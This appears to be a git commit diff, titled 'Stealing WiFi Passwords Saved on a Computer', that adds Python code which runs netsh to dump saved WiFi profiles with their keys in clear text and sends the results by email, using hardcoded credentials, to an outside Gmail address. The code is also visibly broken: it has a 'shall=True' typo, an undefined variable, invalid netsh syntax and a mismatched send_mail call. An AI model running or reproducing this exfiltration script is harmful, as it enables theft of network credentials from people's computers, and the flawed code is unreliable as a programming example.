32db849f5fedcb5dd7f6300c648e3e3bc590e726
Ross M <44169316+Scunnered@users.noreply.github.com>
2020-06-16 14:42:11 +0100

    Stealing WiFi Passwords Saved on a Computer

--- execute_command.py
+++ execute_command.py
@@ -14,7 +14,12 @@ def send_mail(email, password, message):
 command = "netsh wlan show profile UPC723762 key=clear"
 networks = subprocess.check_output(command, shall=True)
 network_names = re.findall("(?:Profile\s*:\s)(.*)", networks)
-print(network_names.group)
+
+result = ""
+for network_name in network_names_list:
+    command = "netsh wlan show profile " + network_name + " key is clear"
+    current_result = subprocess.check_output(command, shell=True)
+    result = result + current_result
 
 
 send_mail("BobPage12@gmail.com, abc123abc12", result)
